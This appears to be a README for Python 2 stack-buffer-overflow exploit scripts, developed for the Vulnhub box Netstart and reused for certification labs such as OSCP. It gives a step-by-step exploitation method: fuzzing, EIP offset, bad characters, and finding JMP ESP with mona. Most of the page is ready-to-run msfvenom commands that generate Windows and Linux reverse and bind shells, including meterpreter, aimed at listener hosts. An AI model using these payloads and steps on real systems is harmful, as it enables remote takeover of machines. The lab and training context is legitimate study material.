# Exploiting Stackbased Buffer Overflow
Python2 based Bufferoverflow scripts I developed while doing the box **Netsart** by **Foxlox** on **Vulnhub**.

**Update Jan 2022**: Following skeleton code worked in my eCPPT, OSCP etc. with small modifications e.g adding '\n' when sending a command. ;-) 

**Walkthrough** link: https://grumpygeekwrites.wordpress.com/2020/12/07/netstart-vulnhub-walk-through-tutorial/

Also Works with: 
> 1. Brainpan Vulnhub (tested)
> 1. Dostackbufferoverflowgood (tested, remember to add "\n" at the end of buffer)
> 1. Offensive Security PG Practice box
> 1. School Vulnhub (tested, but msf_pattern command needs to be modified)

IMP steps to remember are:
> 1. Spiking.
> 1. Fuzzing / Crashing the program with some bytes.
> 1. Noting down those bytes.
> 1. Creating a unique **pattern** via **MSF** of those bytes length and sending it to the program.
> 1. Again crashing the program and noting down the value of **EIP**. 
> 1. Giving the EIP value to MSF **offset** for finding the exact crash point. 
> 1. Controlling **EIP**, to check whether our EIP is filled with 04 x B (EIP = 42 42 42 24)
> 1. Finding badchars, [follow **ESP in dump**] removing it from the BadChars array again and again. We should see neat and clean output from 0000-FFFF.
> 1. Finding the JMP address in ".dll" using mona. 
> 1. Use command01= ```!mona modules``` --- command02= ```!mona find -s '\xff\xe4' -m login_support.dll```. Note down all the addresses.
> 1. If mona fails, manually use SEARCH COMMAND and look for **JMP ESP** address. 
> 1. If there is no module (.dll) file use this ```command03 = !mona jmp -r esp -cpb "\x00"```
> 1. If there is no module (.dll) file use this PUSH ESP command04 = ```!mona find -s "\x54\xc3" -m bufferoverflow.exe```
> 1. Generating a SHELL payload using MSF Venom; remember to select proper architecture and specifying the BADCHARS we found. 
> 1. We should now get shell, our PAYLOAD would be something like ---> **A*(offset value) + JMP Address in little endian format + 8/16/32 NOPs + shellcode**

**What it means**
> 1. **RHOST = remote host -> Kali Box IP**
> 1. **RPORT = remote port -> Kali Box Port**
> 1. **LPORT = local port --> BoF box port (used for BindShell) **
> 
**Generate Shell for Windows**:
> 1. ```msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.100 LPORT=1234 EXITFUNC=thread –e x86/shikata_ga_nai -b "\x00\x2d\x2e\x46\x47\x59\x5e\x60" -f c```
> 1. ```msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x04\xA0" [vulnhub school]```
> 1. ```msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.110 LPORT=80 EXITFUNC=thread -b "\x00\x16\x2F\xF4\xFD" -f c [tryhackme BoF 5]```
> 1. ```msfvenom -p windows/shell_bind_tcp RHOST=192.168.10.100 LPORT=12345 EXITFUNC=thread -b "\x00\x16\x2F\xF4\xFD" -f c [tryhackem BoF 5]```

**Generate Bind Shell for Windows w/meterpreter**:
> 1. ```use exploit/multi/handler```
> 1. ```set payload: windows/meterpreter/bind_tcp```
> 1. ```set EXITFUNC: thread```
> 1. ```set LPORT: 12345```
> 1. ```set RHOST: 192.168.10.100```
> 1. ```msfvenom -p windows/meterpreter/bind_tcp RHOST=192.168.10.100 LPORT=12345 EXITFUNC=thread -b "\x00\x16\x2F\xF4\xFD" -f c [tryhackem BoF 5]```

**Generate Reverse Shell for Windows w/meterpreter**:
> 1. ```msfvenom -p windows/meterpreter/reverse_tcp RHOST=192.168.10.110 RPORT=12345 EXITFUNC=thread -b "\x00\x16\x2F\xF4\xFD" -f c [tryhackem BoF 5]```

**Generate rev-shell for Linux**:
> 1. msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.10.6 LPORT=1234 EXITFUNC=thread -b "\x00\x2d\x2e\x46\x47\x59\x5e\x60" -f c
> 1. from OSPG -> msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.118.5 LPORT=2121 -f py -b "\x00" EXITFUNC=thread

**From School (vulnhub) the msf-pattern_create fails**:
> 1. ```msf-pattern_create -l 2100 -s ABCDEFGHIKL,alienum,123456789```
> 1. ```msf-pattern_offset -q 4C35614C -l 2100 -s ABCDEFGHIKL,alienum,123456789```
